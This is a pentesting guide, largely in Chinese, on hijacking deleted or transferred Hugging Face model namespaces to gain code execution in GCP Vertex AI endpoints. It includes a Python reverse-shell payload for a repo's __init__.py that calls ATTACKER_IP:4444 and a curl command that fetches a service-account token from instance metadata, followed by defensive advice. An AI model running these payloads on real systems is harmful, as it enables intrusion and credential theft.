# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## 场景

- Vertex AI Model Garden 允许直接部署许多 Hugging Face (HF) 模型。
- HF 模型标识符为 Author/ModelName。如果 HF 上的 author/org 被删除，任何人都可以重新注册相同的 author 名称。攻击者随后可以在旧路径上创建具有相同 ModelName 的仓库。
- Pipelines、SDKs 或仅按名称获取的 cloud catalogs（无 pinning/integrity）将拉取由攻击者控制的仓库。当模型被部署时，该仓库中的 loader code 可以在 Vertex AI endpoint 容器内部执行，从而以 endpoint 的权限获取 RCE。

HF 上两种常见的接管情况：
- Ownership deletion：旧路径返回 404，直到有人重新注册该 author 并发布相同的 ModelName。
- Ownership transfer：HF 会对旧的 Author/ModelName 发出 307 重定向到新所有者。如果旧 author 随后被删除并被攻击者重新注册，重定向链将被打破，攻击者的仓库会在旧路径提供内容。

## 识别可重用的命名空间 (HF)

- 已删除旧 author：author 的页面返回 404；模型路径可能在接管前返回 404。
- 已转移的模型：在旧 author 存在时，旧的模型路径会对新所有者发出 307。如果旧 author 随后被删除并被重新注册，遗留路径将解析到攻击者的仓库。

使用 curl 进行快速检查：
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## End-to-end Attack Flow against Vertex AI

1) Discover reusable model namespaces that Model Garden lists as deployable:
- 查找在 Vertex AI Model Garden 中仍显示为 “verified deployable” 的 HF 模型。
- 在 HF 上确认原始作者是否已被删除，或模型是否被转移且旧作者随后被移除。

2) Re-register the deleted author on HF and recreate the same ModelName.

3) Publish a malicious repo. Include code that executes on model load. Examples that commonly execute during HF model load:
- Side effects in __init__.py of the repo
- Custom modeling_*.py or processing code referenced by config/auto_map
- Code paths that require trust_remote_code=True in Transformers pipelines

4) A Vertex AI deployment of the legacy Author/ModelName now pulls the attacker repo. The loader executes inside the Vertex AI endpoint container.

5) Payload establishes access from the endpoint environment (RCE) with the endpoint’s permissions.

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notes
- 实际环境中的加载器各不相同。许多 Vertex AI HF 集成会克隆并导入模型配置中引用的仓库模块（例如 auto_map），这可能触发代码执行。有些用法需要 trust_remote_code=True。
- 该 endpoint 通常在作用域受限的专用容器中运行，但它仍然是获取数据访问和在 GCP 内横向移动的有效初始立足点。

## Post-Exploitation Tips (Vertex AI Endpoint)

一旦代码在 endpoint 容器内运行，可考虑：
- 列举环境变量和元数据以获取凭证/令牌
- 访问附加存储或挂载的模型制品
- 通过服务账户身份与 Google APIs 交互（Document AI、Storage、Pub/Sub 等）
- 在模型制品中实现持久化，如果平台会重新拉取仓库

如果可访问（取决于容器），列举实例元数据：
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Vertex AI 用户的防御建议

- 在 HF loaders 中按 commit 固定模型以防止静默替换：
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 将经过审查的 HF 模型镜像到受信任的内部 artifact 存储/注册表，并从那里进行部署。
- 持续扫描代码库和配置，查找被硬编码的 Author/ModelName（已删除/已转移）；将其更新为新的命名空间或按 commit 固定。
- 在 Model Garden 中，部署前验证模型来源和作者是否存在。

## Recognition Heuristics (HTTP)

- 已删除的作者：作者页面返回404；遗留模型路径在被接管前返回404。
- 已转移的模型：在旧作者仍存在时，遗留路径以307重定向到新作者；如果旧作者随后被删除并重新注册，遗留路径将提供攻击者的内容。
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 交叉引用

- 参见更广泛的方法论和供应链说明：

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 参考资料

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
